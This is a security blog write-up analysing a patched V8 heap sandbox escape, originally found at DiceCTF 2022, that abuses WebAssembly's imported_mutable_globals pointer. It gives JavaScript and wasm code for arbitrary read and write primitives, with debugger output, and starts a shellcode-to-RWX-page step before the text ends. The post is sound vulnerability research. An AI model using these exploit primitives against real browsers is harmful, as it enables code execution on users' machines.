<!doctype html><html lang=en>
<head><title>
Exploring Historical V8 Heap Sandbox Escapes I &ndash; Anvbis
</title>
<meta name=description content>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta charset=utf-8>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css integrity="sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==" crossorigin=anonymous>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.1/css/academicons.min.css integrity="sha512-b1ASx0WHgVFL5ZQhTgiPWX+68KjS38Jk87jg7pe+qC7q9YkEtFq0z7xCglv7qGIs/68d3mAp+StfC8WKC5SSAg==" crossorigin=anonymous>
<link rel=stylesheet href=https://anvbis.github.io/css/palettes/horizon-dark.css>
<link rel=stylesheet href=https://anvbis.github.io/css/risotto.css>
<link rel=stylesheet href=https://anvbis.github.io/css/custom.css>
<link rel=stylesheet href=https://anvbis.github.io/css/syntax/theme.css>
</head>
<body>
<div class=page>
<header class=page__header><h1 class=page__logo><a href=https://anvbis.github.io/ class=page__logo-inner>anvbis@anvbis</a></h1>
<nav class="page__nav main-nav">
<ul>
<li class=main-nav__item><a class=nav-main-item href=https://anvbis.github.io/about title>About</a></li>
</ul>
</nav>
<ul class=aside__social-links>
<li>
<a href=https://github.com/anvbis rel=me aria-label=GitHub title=GitHub><i class="fa-brands fa-github" aria-hidden=true></i></a>&nbsp;
</li>
<li>
<a href=mailto:contact@anvbis.au rel=me aria-label=Email title=Email><i class="fa fa-envelope" aria-hidden=true></i></a>&nbsp;
</li>
</ul>
</header>
<section class=page__body>
<header class=content__header>
<h1>Exploring Historical V8 Heap Sandbox Escapes I</h1>
</header>
<div class=content__body>
<h2 id=motivation>Motivation</h2>
<p>In anticipation of the future implementation of CFI on <code>code_entry_point</code> fields within function objects (the vector by which most publicly known heap sandbox escapes currently occur), I wanted to explore some patched sandbox escapes that have been found in the past.</p>
<p>In this post I&rsquo;ll be looking at the following patch: <a href=https://chromium-review.googlesource.com/c/v8/v8/+/3845636>[sandbox] Remove a number of native allocations from WasmInstanceObject</a>.</p>
<h2 id=overview>Overview</h2>
<p>The heap sandbox escape I&rsquo;ll be looking into today was originally found during DiceCTF 2022. The blog post detailing this technique can be found <a href=https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/>here</a>.</p>
<p>In practice it&rsquo;s pretty simple, involving corrupting memory within a WebAssembly instance object. Specifically the pointer to the instance&rsquo;s mutable globals store, allowing us to read or write arbitrary memory via global variables.</p>
<p>This was due to WebAssembly storing globals data in a location external to the heap sandbox (meaning that it was an un-sandboxed external pointer). The patch for it just involved moving this data store to the heap itself.</p>
<h2 id=enabling-the-memory-corruption-api>Enabling the Memory Corruption API</h2>
<p>Before building, I thought it best to enable the memory corruption API rather than implement a vulnerability into V8 itself.</p>
<p>The memory corruption API implements several functions that makes manipulating memory within the heap sandbox a lot easier.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=gh>diff --git a/BUILD.gn b/BUILD.gn
</span><span class=gh>index af24f4309a..5ca4c0666a 100644
</span><span class=gh></span><span class=gd>--- a/BUILD.gn
</span><span class=gd></span><span class=gi>+++ b/BUILD.gn
</span><span class=gi></span><span class=gu>@@ -305,7 +305,7 @@ declare_args() {
</span><span class=gu></span> 
   # Enable the experimental V8 sandbox.
   # Sets -DV8_ENABLE_SANDBOX.
<span class=gd>-  v8_enable_sandbox = &#34;&#34;
</span><span class=gd></span><span class=gi>+  v8_enable_sandbox = true
</span><span class=gi></span> 
   # Enable sandboxing for all external pointers. Requires v8_enable_sandbox.
   # Sets -DV8_SANDBOXED_EXTERNAL_POINTERS.
<span class=gu>@@ -317,7 +317,7 @@ declare_args() {
</span><span class=gu></span>   # Expose the memory corruption API to JavaScript. Useful for testing the sandbox.
   # WARNING This will expose builtins that (by design) cause memory corruption.
   # Sets -DV8_EXPOSE_MEMORY_CORRUPTION_API
<span class=gd>-  v8_expose_memory_corruption_api = false
</span><span class=gd></span><span class=gi>+  v8_expose_memory_corruption_api = true
</span><span class=gi></span> 
   # Experimental feature for collecting per-class zone memory stats.
   # Requires use_rtti = true
</code></pre></div><p>For this particular heap sandbox escape, we&rsquo;ll need to build out some typical exploit primitives. I won&rsquo;t go into much detail here, but you can find the relevant code below.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>buf</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ArrayBuffer</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>f64</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Float64Array</span><span class=p>(</span><span class=nx>buf</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>u64</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>BigUint64Array</span><span class=p>(</span><span class=nx>buf</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>i64</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>BigInt64Array</span><span class=p>(</span><span class=nx>buf</span><span class=p>);</span>

<span class=kr>const</span> <span class=nx>utof</span> <span class=o>=</span> <span class=nx>x</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=nx>u64</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>x</span><span class=p>;</span>
  <span class=k>return</span> <span class=nx>f64</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
<span class=p>};</span>

<span class=kr>const</span> <span class=nx>itou</span> <span class=o>=</span> <span class=nx>x</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=nx>i64</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>x</span><span class=p>;</span>
  <span class=k>return</span> <span class=nx>u64</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
<span class=p>};</span>

<span class=kr>const</span> <span class=nx>hex</span> <span class=o>=</span> <span class=nx>x</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=k>return</span> <span class=sb>`0x</span><span class=si>${</span><span class=nx>x</span><span class=p>.</span><span class=nx>toString</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span> 
<span class=p>};</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>addrof</span> <span class=o>=</span> <span class=nx>o</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=k>return</span> <span class=nx>Sandbox</span><span class=p>.</span><span class=nx>getAddressOf</span><span class=p>(</span><span class=nx>o</span><span class=p>);</span>
<span class=p>};</span>

<span class=kr>const</span> <span class=nx>weak_read</span> <span class=o>=</span> <span class=nx>p</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>reader</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Sandbox</span><span class=p>.</span><span class=nx>MemoryView</span><span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=mi>64</span><span class=p>);</span>
  <span class=kd>let</span> <span class=nx>view</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=nx>reader</span><span class=p>);</span>
  <span class=k>return</span> <span class=nx>view</span><span class=p>.</span><span class=nx>getBigUint64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span> 
<span class=p>};</span>

<span class=kr>const</span> <span class=nx>weak_write</span> <span class=o>=</span> <span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=kd>let</span> <span class=nx>writer</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Sandbox</span><span class=p>.</span><span class=nx>MemoryView</span><span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=mi>64</span><span class=p>);</span>
  <span class=kd>let</span> <span class=nx>view</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>DataView</span><span class=p>(</span><span class=nx>writer</span><span class=p>);</span>
  <span class=nx>view</span><span class=p>.</span><span class=nx>setBigUint64</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>x</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
<span class=p>};</span>
</code></pre></div><h2 id=webassembly-mutable-globals>WebAssembly Mutable Globals</h2>
<pre><code>DebugPrint: 0x237001d4521: [WasmInstanceObject] in OldSpace
 - map: 0x023700207891 &lt;Map[256](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x0237000486f1 &lt;Object map = 0x23700208151&gt;
 - elements: 0x023700002251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
...
 - imported_mutable_globals: 0x561312e4e250
...
</code></pre><div class=highlight><pre tabindex=0 class=chroma><code class=language-clojure data-lang=clojure><span class=p>(</span><span class=nf>module</span>
  <span class=p>(</span><span class=nf>global</span> <span class=nv>$g</span> <span class=p>(</span><span class=nb>import </span><span class=s>&#34;js&#34;</span> <span class=s>&#34;global&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>mut</span> <span class=nv>i32</span><span class=p>))</span>
  <span class=p>(</span><span class=nf>func</span> <span class=p>(</span><span class=nf>export</span> <span class=s>&#34;getGlobal&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>result</span> <span class=nv>i32</span><span class=p>)</span>
    <span class=p>(</span><span class=nf>global.get</span> <span class=nv>$g</span><span class=p>)</span>
  <span class=p>)</span>
  <span class=p>(</span><span class=nf>func</span> <span class=p>(</span><span class=nf>export</span> <span class=s>&#34;incGlobal&#34;</span><span class=p>)</span>
    <span class=p>(</span><span class=nf>global.set</span> <span class=nv>$g</span> <span class=p>(</span><span class=nf>i32.add</span> <span class=p>(</span><span class=nf>global.get</span> <span class=nv>$g</span><span class=p>)</span> <span class=p>(</span><span class=nf>i32.const</span> <span class=mi>1</span><span class=p>)))</span>
  <span class=p>)</span>
<span class=p>)</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>global</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Global</span><span class=p>({</span> <span class=nx>value</span><span class=o>:</span> <span class=s2>&#34;i32&#34;</span><span class=p>,</span> <span class=nx>mutable</span><span class=o>:</span> <span class=kc>true</span> <span class=p>},</span> <span class=mi>0</span><span class=p>);</span>

<span class=kd>let</span> <span class=nx>wasm</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span>
  <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x7f</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span>
  <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x19</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x6e</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0b</span><span class=p>,</span> <span class=mh>0x09</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0b</span>
<span class=p>]);</span>
<span class=kd>let</span> <span class=nx>module</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Module</span><span class=p>(</span><span class=nx>wasm</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Instance</span><span class=p>(</span><span class=nx>module</span><span class=p>,</span> <span class=p>{</span>
  <span class=nx>js</span><span class=o>:</span> <span class=p>{</span> <span class=nx>global</span> <span class=p>}</span>
<span class=p>});</span>

<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>getGlobal</span><span class=p>());</span> <span class=c1>// 0
</span><span class=c1></span><span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>incGlobal</span><span class=p>();</span>
<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>getGlobal</span><span class=p>());</span> <span class=c1>// 1
</span></code></pre></div><h2 id=corrupting-the-imported-mutable-globals-pointer>Corrupting the Imported Mutable Globals Pointer</h2>
<p>So what happens if we decide to corrupt the <code>imported_mutable_globals</code> pointer? Well it appears to
be a external pointer (i.e. outside of the heap), so logically we should be able to read or modify
an arbitrary location in memory.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=o>%</span><span class=nx>DebugPrint</span><span class=p>(</span><span class=nx>instance</span><span class=p>);</span>
<span class=o>%</span><span class=nx>SystemBreak</span><span class=p>();</span>

<span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>incGlobal</span><span class=p>();</span>
<span class=o>%</span><span class=nx>SystemBreak</span><span class=p>();</span>
</code></pre></div><pre><code>DebugPrint: 0x1f84001d4659: [WasmInstanceObject] in OldSpace
 - map: 0x1f8400207891 &lt;Map[256](HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x1f8400048709 &lt;Object map = 0x1f8400208241&gt;
 - elements: 0x1f8400002251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
...
 - imported_mutable_globals: 0x55afdf05e3e0
...
</code></pre><p>When reading from the first entry in <code>imported_mutable_globals</code> we can see it holds a value of <code>0</code>.
Continuing so the <code>incGlobal</code> function is called, we can see that this value has been updated to
<code>1</code>. Which is what we&rsquo;d expect.</p>
<pre><code>pwndbg&gt; x/gx 0x55afdf05e3e0
0x55afdf05e3e0:	0x00001f8500001000
pwndbg&gt; x/gx 0x00001f8500001000
0x1f8500001000:	0x0000000000000000
pwndbg&gt; c
Continuing.

pwndbg&gt; x/gx 0x00001f8500001000
0x1f8500001000:	0x0000000000000001
</code></pre><p>Let&rsquo;s see what happens when we completely corrupt the first pointer in the
<code>imported_mutable_globals</code> table. That is, not the <code>imported_mutable_globals</code> pointer itself,
but the first entry within it.</p>
<pre><code>pwndbg&gt; set *(uint64_t *)(0x56394c0dc3d0) = 0x4141414141414141
pwndbg&gt; x/gx 0x56394c0dc3d0
0x56394c0dc3d0:	0x4141414141414141
pwndbg&gt; c
Continuing.

Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.
</code></pre><p>We receive a segmentation fault when trying to read from the location in memory we specified. In
the disassembly below, the next step was to incremement the value retrieved by <code>1</code>, before later
storing it back into the location in memory it was retrieved from.</p>
<p>This is exactly the behaviour we&rsquo;d expect to see from a function that increments a global
variable.</p>
<pre><code> ► 0x2d0f6f7876a2    mov    ecx, dword ptr [rax]
   0x2d0f6f7876a4    add    ecx, 1
   0x2d0f6f7876a7    mov    rax, qword ptr [rsi + 0x57]
   0x2d0f6f7876ab    mov    rax, qword ptr [rax]
   0x2d0f6f7876ae    mov    dword ptr [rax], ecx
</code></pre><pre><code>pwndbg&gt; p/x $rax
$1 = 0x4141414141414141
</code></pre><h2 id=an-arbitrary-read-primitive>An Arbitrary Read Primitive</h2>
<p>So the question becomes, how do we turn this functionality into arbitrary read or write
primitives?</p>
<p>Well, from observing the behaviour above, it would likely involve the corruption of one primary
value; that of the <code>imported_mutable_globals</code> pointer. But this value doesn&rsquo;t point directly to
the global variable that is modified - so we&rsquo;d need to point it to an area of memory we control
and store a pointer to the memory we want to modify at that location.</p>
<p>The below web-assembly will read a 64-bit value from a mutable global variable.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-clojure data-lang=clojure><span class=p>(</span><span class=nf>module</span>
  <span class=p>(</span><span class=nf>global</span> <span class=nv>$g</span> <span class=p>(</span><span class=nb>import </span><span class=s>&#34;js&#34;</span> <span class=s>&#34;global&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>mut</span> <span class=nv>i64</span><span class=p>))</span>
  <span class=p>(</span><span class=nf>func</span> <span class=p>(</span><span class=nf>export</span> <span class=s>&#34;read&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>result</span> <span class=nv>i64</span><span class=p>)</span>
    <span class=p>(</span><span class=nf>global.get</span> <span class=nv>$g</span><span class=p>)</span>
  <span class=p>)</span>
<span class=p>)</span>
</code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>global</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Global</span><span class=p>({</span> <span class=nx>value</span><span class=o>:</span> <span class=s2>&#34;i64&#34;</span><span class=p>,</span> <span class=nx>mutable</span><span class=o>:</span> <span class=kc>true</span> <span class=p>},</span> <span class=mi>0</span><span class=nx>n</span><span class=p>);</span>

<span class=kd>let</span> <span class=nx>wasm</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x7e</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x0e</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x6a</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x6f</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span>
  <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x6c</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x7e</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x07</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span>
  <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x0a</span><span class=p>,</span> <span class=mh>0x06</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span>
  <span class=mh>0x0b</span>
<span class=p>]);</span>
<span class=kd>let</span> <span class=nx>module</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Module</span><span class=p>(</span><span class=nx>wasm</span><span class=p>);</span>
<span class=kd>let</span> <span class=nx>instance</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>WebAssembly</span><span class=p>.</span><span class=nx>Instance</span><span class=p>(</span><span class=nx>module</span><span class=p>,</span> <span class=p>{</span>
  <span class=nx>js</span><span class=o>:</span> <span class=p>{</span> <span class=nx>global</span> <span class=p>}</span>
<span class=p>});</span>
</code></pre></div><p>As mentioned above, the primary objective we need to achieve is control over the
<code>imported_mutable_globals</code> table. I did this by simply pointing it to the elements store of
a float array. This way the entries within the table could easily be replaced.</p>
<p>If we want to replace this value with a location on the heap, this will also require a heap
address leak (which is easily obtained).</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=nx>heap</span> <span class=o>=</span> <span class=p>(</span><span class=nx>weak_read</span><span class=p>(</span><span class=mh>0x18</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>)</span> <span class=o>&lt;&lt;</span> <span class=mi>32</span><span class=nx>n</span><span class=p>;</span>
<span class=kd>let</span> <span class=nx>store</span> <span class=o>=</span> <span class=p>[</span><span class=mf>1.1</span><span class=p>];</span>
<span class=kd>let</span> <span class=nx>elements</span> <span class=o>=</span> <span class=nx>heap</span> <span class=o>+</span> <span class=p>(</span><span class=nx>weak_read</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>store</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span><span class=nx>n</span><span class=p>);</span>
<span class=nx>weak_write</span><span class=p>(</span><span class=nx>addrof</span><span class=p>(</span><span class=nx>instance</span><span class=p>)</span> <span class=o>+</span> <span class=mh>0x58</span><span class=p>,</span> <span class=nx>elements</span> <span class=o>+</span> <span class=mi>8</span><span class=nx>n</span> <span class=o>-</span> <span class=mi>1</span><span class=nx>n</span><span class=p>);</span>

<span class=nx>store</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>utof</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=nx>n</span><span class=p>);</span>
<span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>read</span><span class=p>();</span>
</code></pre></div><pre><code>Thread 1 &quot;d8&quot; received signal SIGSEGV, Segmentation fault.
...
 ► 0x2e60bc29c662    mov    rcx, qword ptr [rax]
...
pwndbg&gt; p/x $rax
$1 = 0xdeadbeef
</code></pre><p>This is easily extracted out into a function. A pointer is provided and stored in the controlled
<code>imported_mutable_globals</code> table, and a value is read from it.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>strong_read</span> <span class=o>=</span> <span class=nx>p</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=nx>store</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>utof</span><span class=p>(</span><span class=nx>p</span><span class=p>);</span>
  <span class=k>return</span> <span class=nx>itou</span><span class=p>(</span><span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>read</span><span class=p>());</span>
<span class=p>};</span>
</code></pre></div><h2 id=an-arbitrary-write-primitive>An Arbitrary Write Primitive</h2>
<p>The arbitrary write primitive is implemented in an almost identical manner to the read primitive.
However, a new web-assembly function is introduced that writes a 64-bit integer to the global
variable.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-clojure data-lang=clojure><span class=p>(</span><span class=nf>module</span>
  <span class=p>(</span><span class=nf>global</span> <span class=nv>$g</span> <span class=p>(</span><span class=nb>import </span><span class=s>&#34;js&#34;</span> <span class=s>&#34;global&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>mut</span> <span class=nv>i64</span><span class=p>))</span>
  <span class=p>(</span><span class=nf>func</span> <span class=p>(</span><span class=nf>export</span> <span class=s>&#34;read&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>result</span> <span class=nv>i64</span><span class=p>)</span>
    <span class=p>(</span><span class=nf>global.get</span> <span class=nv>$g</span><span class=p>)</span>
  <span class=p>)</span>
  <span class=p>(</span><span class=nf>func</span> <span class=p>(</span><span class=nf>export</span> <span class=s>&#34;write&#34;</span><span class=p>)</span> <span class=p>(</span><span class=nf>param</span> <span class=nv>$p</span> <span class=nv>i64</span><span class=p>)</span>
    <span class=p>(</span><span class=nf>global.set</span> <span class=nv>$g</span> <span class=p>(</span><span class=nf>local.get</span> <span class=nv>$p</span><span class=p>))</span>
  <span class=p>)</span>
<span class=p>)</span>
</code></pre></div><p>You can see how similar it is to the read primitive. It uses the same logic to replaced the
pointer to the location in memory we want to modify.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kr>const</span> <span class=nx>strong_write</span> <span class=o>=</span> <span class=p>(</span><span class=nx>p</span><span class=p>,</span> <span class=nx>x</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
  <span class=nx>store</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nx>utof</span><span class=p>(</span><span class=nx>p</span><span class=p>);</span>
  <span class=nx>instance</span><span class=p>.</span><span class=nx>exports</span><span class=p>.</span><span class=nx>write</span><span class=p>(</span><span class=nx>x</span><span class=p>);</span>
<span class=p>};</span>
</code></pre></div><h2 id=code-execution>Code Execution</h2>
<p>In order to achieve code execution we don&rsquo;t actually require the arbitrary read primitive. All the
values we need to leak are already stored on the heap.</p>
<p>The arbitrary write primitive however, is extremely useful. In the code below, it is used to write
shellcode to the <code>rwx</code> page allocated by a wasm instance object. This, of course, is a very well
documented technique used to achieve code execution in V8.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=kd>let</span> <span class=mi>_</span><span class=nx>wasm</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Uint8Array</span><span class=p>([</span>
  <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x6d</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x85</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span> <span class=mh>0x80</span><span class=p>,</span>
